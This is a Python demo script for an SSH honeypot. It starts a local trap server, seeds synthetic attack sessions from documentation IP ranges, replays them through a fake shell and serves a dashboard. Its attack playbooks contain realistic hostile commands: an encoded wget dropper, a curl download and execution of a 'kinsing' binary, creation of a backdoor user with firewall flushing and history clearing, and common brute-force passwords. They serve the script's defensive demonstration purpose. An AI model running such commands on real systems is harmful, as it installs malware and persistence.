#!/usr/bin/env python3
"""
One-command local demo: honeypot + realistic attack data + dashboard.

    python scripts/demo.py              # then open http://127.0.0.1:5000
    python scripts/demo.py --fresh      # wipe previous demo data first

What it does
  1. starts a real honeypot on 127.0.0.1:2222 (demo data lives in ./data-demo/)
  2. seeds ~150 sessions from documentation-only IP ranges (RFC 5737), spread
     over the last 24 h and replayed through the real fake shell + analyzer
  3. runs live SSH attacks against the honeypot with Paramiko
  4. serves the dashboard and opens it in your browser

While it runs you can also attack it yourself:  ssh -p 2222 root@127.0.0.1  (password: root)
Everything stays on 127.0.0.1. Press Ctrl+C to stop.
"""

from __future__ import annotations

import argparse
import base64
import dataclasses
import logging
import random
import shutil
import sqlite3
import sys
import threading
import webbrowser
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scripts"))

import simulate_attack  # noqa: E402

from honeypot.config import DashboardSettings, HoneypotSettings  # noqa: E402
from honeypot.dashboard.app import create_app  # noqa: E402
from honeypot.database import EventStore  # noqa: E402
from honeypot.fake_shell import FakeShell  # noqa: E402
from honeypot.server import HoneypotServer, SessionContext, _record_command  # noqa: E402

# RFC 5737 documentation ranges: guaranteed not to be real hosts.
DEMO_IPS = (
    [f"198.51.100.{i}" for i in (7, 23, 45, 88, 131, 172)]
    + [f"203.0.113.{i}" for i in (9, 14, 77, 150, 201)]
    + [f"192.0.2.{i}" for i in (3, 66, 120, 240)]
)
IP_WEIGHTS = [14, 9, 7, 6, 5, 3, 12, 8, 4, 3, 2, 6, 3, 2, 1]
# Attacker personas so the threat levels look like real traffic:
BRUTE_ONLY = {"192.0.2.3", "192.0.2.66", "198.51.100.172", "203.0.113.201"}  # never get in
RECON_ONLY = {"198.51.100.88", "192.0.2.120"}  # get in, only fingerprint the box
CLIENTS = [
    "SSH-2.0-Go",
    "SSH-2.0-libssh2_1.10.0",
    "SSH-2.0-paramiko_3.4.0",
    "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
    "SSH-2.0-PuTTY_Release_0.80",
    "SSH-2.0-libssh_0.9.6",
]
USERS = ["root"] * 8 + ["admin", "admin", "ubuntu", "pi", "test", "oracle", "postgres", "user", "git", "support"]
PASSWORDS = [
    "123456", "password", "admin", "root", "12345678", "qwerty", "1q2w3e4r", "toor", "raspberry",
    "ubnt", "test", "P@ssw0rd", "123123", "changeme", "admin123", "1234", "111111", "abc123",
]  # fmt: skip

_DROPPER = base64.b64encode(b"cd /tmp; wget http://203.0.113.50/b.sh; chmod +x b.sh; ./b.sh").decode()
PLAYBOOKS = [
    *simulate_attack.SCRIPTS,
    [f"echo {_DROPPER} | base64 -d | sh", "rm -rf /tmp/b.sh"],
    ["uname -a; nproc; free -m | grep Mem | awk '{print $2}'", "cat /proc/cpuinfo | grep name | wc -l"],
    ["cd /tmp || cd /var/tmp", "curl -fsSL http://198.51.100.200/kinsing -o k", "chmod 777 k", "./k"],
    ["useradd -m -s /bin/bash sysadm", "echo 'sysadm:Passw0rd!' | chpasswd", "iptables -F", "history -c"],
    ["ls -la", "cat /etc/os-release", "ps aux", "exit"],
]


def seed(settings: HoneypotSettings, sessions: int) -> None:
    rng = random.Random(1337)
    store = EventStore(settings.db_path, settings.jsonl_file)
    for _ in range(sessions):
        ip = rng.choices(DEMO_IPS, weights=IP_WEIGHTS)[0]
        sid = store.create_session(ip, rng.randint(30000, 65000))
        ctx = SessionContext(sid=sid, ip=ip, port=22, store=store, settings=settings)
        if rng.random() < 0.15:  # port scanner: no SSH handshake at all
            store.end_session(sid, rng.uniform(0.1, 1.0), "handshake_failed")
            continue
        store.set_client_version(sid, rng.choice(CLIENTS))
        user = ""
        for attempt in range(rng.randint(1, 6)):
            user, pwd = rng.choice(USERS), rng.choice(PASSWORDS)
            ok = ip not in BRUTE_ONLY and (
                (user, pwd) in settings.accepted_creds or (attempt >= 2 and rng.random() < 0.2)
            )
            store.log_auth(sid, ip, "password", user, ok, password=pwd)
            if ok:
                ctx.logged_in = True
                store.mark_login(sid, user, pwd)
                break
        if not ctx.logged_in:
            store.end_session(sid, rng.uniform(0.3, 8), "auth_failed")
            continue
        shell = FakeShell(user, settings.hostname, ip)
        playbook = PLAYBOOKS[0] if ip in RECON_ONLY else rng.choice(PLAYBOOKS)
        for line in playbook:
            _record_command(ctx, shell, line, "shell")
        store.end_session(sid, rng.uniform(4, 180), "logout")
    store.close()

    # spread the seeded sessions over the last 24 hours so the timeline has shape
    conn = sqlite3.connect(settings.db_path)
    for (sid,) in conn.execute("SELECT id FROM sessions WHERE src_ip != '127.0.0.1'").fetchall():
        shift = f"-{rng.randint(5, 23 * 60 + 50)} minutes"
        conn.execute(
            "UPDATE sessions SET started_at = datetime(started_at, ?), ended_at = datetime(ended_at, ?) WHERE id = ?",
            (shift, shift, sid),
        )
        conn.execute(  # make ended_at consistent with the recorded duration
            "UPDATE sessions SET ended_at = datetime(started_at, '+' || CAST(duration AS INTEGER) || ' seconds') "
            "WHERE id = ?",
            (sid,),
        )
        for table in ("auth_attempts", "commands", "iocs"):
            conn.execute(f"UPDATE {table} SET ts = datetime(ts, ?) WHERE session_id = ?", (shift, sid))
    conn.commit()
    conn.close()


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", type=int, default=2222, help="honeypot port (default 2222)")
    ap.add_argument("--dash-port", type=int, default=5000, help="dashboard port (default 5000)")
    ap.add_argument("--seed", type=int, default=150, help="number of synthetic sessions (0 = none)")
    ap.add_argument("--rounds", type=int, default=3, help="live SSH attack rounds")
    ap.add_argument("--data", default="data-demo", help="demo data directory")
    ap.add_argument("--fresh", action="store_true", help="delete previous demo data first")
    ap.add_argument("--no-browser", action="store_true")
    args = ap.parse_args()

    data = (ROOT / args.data).resolve()
    if args.fresh and data.exists():
        shutil.rmtree(data)
    data.mkdir(parents=True, exist_ok=True)

    logging.basicConfig(level=logging.WARNING, format="%(levelname)s %(name)s: %(message)s")
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    settings = dataclasses.replace(
        HoneypotSettings(),
        bind_host="127.0.0.1",
        port=args.port,
        auth_mode="list",
        db_path=data / "honeypot.db",
        host_key_path=data / "host_rsa.key",
        log_file=data / "honeypot.log",
        jsonl_file=data / "events.jsonl",
    )

    print(f"[1/4] starting honeypot on 127.0.0.1:{args.port} ...")
    server = HoneypotServer(settings)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    if not server.ready.wait(10):
        print("honeypot failed to start", file=sys.stderr)
        return 1

    if args.seed:
        print(f"[2/4] seeding {args.seed} synthetic attack sessions ...")
        seed(settings, args.seed)
    print(f"[3/4] running {args.rounds} live SSH attack round(s) ...")
    for i in range(args.rounds):
        print(f"  round {i + 1}")
        simulate_attack.run_round("127.0.0.1", args.port)

    app = create_app(DashboardSettings(host="127.0.0.1", port=args.dash_port, db_path=settings.db_path, password=""))
    url = f"http://127.0.0.1:{args.dash_port}"
    print(f"[4/4] dashboard: {url}")
    print(f"      attack it yourself:  ssh -p {args.port} root@127.0.0.1   (password: root)")
    print("      Ctrl+C to stop")
    if not args.no_browser:
        threading.Timer(1.5, webbrowser.open, args=[url]).start()

    from waitress import serve

    try:
        serve(app, host="127.0.0.1", port=args.dash_port, threads=8, ident="")
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        server.store.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
